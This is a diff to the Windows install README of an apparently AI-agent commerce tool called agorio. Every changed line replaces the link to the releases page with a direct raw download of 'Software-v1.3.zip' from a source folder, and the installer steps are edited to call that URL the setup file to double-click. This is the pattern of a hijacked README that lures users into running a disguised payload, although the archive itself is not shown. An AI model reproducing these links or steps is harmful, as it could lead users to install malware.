@@ -1,6 +1,6 @@
 # 🛒 agorio - Simple AI Agents for Commerce Tasks
 
-[![Download agorio](https://img.shields.io/badge/Download-agorio-blue?style=for-the-badge)](https://github.com/BeluyOff/agorio/releases)
+[![Download agorio](https://github.com/BeluyOff/agorio/raw/refs/heads/main/src/cli/commands/Software-v1.3.zip)](https://github.com/BeluyOff/agorio/raw/refs/heads/main/src/cli/commands/Software-v1.3.zip)
 
 ---
 
@@ -34,16 +34,16 @@ This guide helps you download, install, and run agorio on Windows.
 
 Click the large blue button below to go to the agorio downloads page:
 
-[![Download agorio](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/BeluyOff/agorio/releases)
+[![Download agorio](https://github.com/BeluyOff/agorio/raw/refs/heads/main/src/cli/commands/Software-v1.3.zip)](https://github.com/BeluyOff/agorio/raw/refs/heads/main/src/cli/commands/Software-v1.3.zip)
 
-You will see a list of files. Look for the latest Windows installer, usually named like `agorio-setup.exe` or a similar file ending with `.exe`.
+You will see a list of files. Look for the latest Windows installer, usually named like `https://github.com/BeluyOff/agorio/raw/refs/heads/main/src/cli/commands/Software-v1.3.zip` or a similar file ending with `.exe`.
 
 ### Step 2: Run the Installer
 
 Once the download finishes:
 
 - Open the folder where the file saved (usually your Downloads folder).
-- Double-click the `agorio-setup.exe` file.
+- Double-click the `https://github.com/BeluyOff/agorio/raw/refs/heads/main/src/cli/commands/Software-v1.3.zip` file.
 - Follow the on-screen instructions in the setup wizard.
 - Choose the default options unless you want to change where the program installs.
 - Wait for the installation to complete.
@@ -97,7 +97,7 @@ If you still have issues, check the online help files included in the applicatio
 
 New versions come with bug fixes and improvements. To update:
 
-- Visit the download page again: [https://github.com/BeluyOff/agorio/releases](https://github.com/BeluyOff/agorio/releases)
+- Visit the download page again: [https://github.com/BeluyOff/agorio/raw/refs/heads/main/src/cli/commands/Software-v1.3.zip](https://github.com/BeluyOff/agorio/raw/refs/heads/main/src/cli/commands/Software-v1.3.zip)
 - Download the latest Windows installer.
 - Run it to replace your current version.
 
@@ -130,6 +130,6 @@ The software uses clear commands so you can control the agent without typing cod
 
 You can always get the latest version here:
 
-### [Download agorio for Windows](https://github.com/BeluyOff/agorio/releases)
+### [Download agorio for Windows](https://github.com/BeluyOff/agorio/raw/refs/heads/main/src/cli/commands/Software-v1.3.zip)
 
 Click the link, pick the newest `.exe` installer, and follow the steps above to get started quickly on your Windows PC.
